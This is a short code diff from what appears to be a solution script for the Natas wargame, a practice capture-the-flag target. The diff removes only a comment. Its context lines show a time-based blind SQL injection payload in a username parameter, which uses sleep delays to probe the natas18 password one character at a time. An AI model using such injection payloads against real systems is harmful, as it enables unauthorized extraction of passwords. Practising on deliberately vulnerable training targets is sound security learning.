@@ -16,7 +16,6 @@ def discover_charset():
     discovered_charset = ''
     print("Attempting to discover charset for brute force attempt..")
     for char in chars:
-        #requests hackers through grep, if char gets added onto it through discovery we found a valid character!
         try:
             r = requests.get(url + '?username=natas18" AND IF(password LIKE BINARY "%' + char + '%", sleep(5),null) #', timeout=1, headers=header)
             print(r.content)        
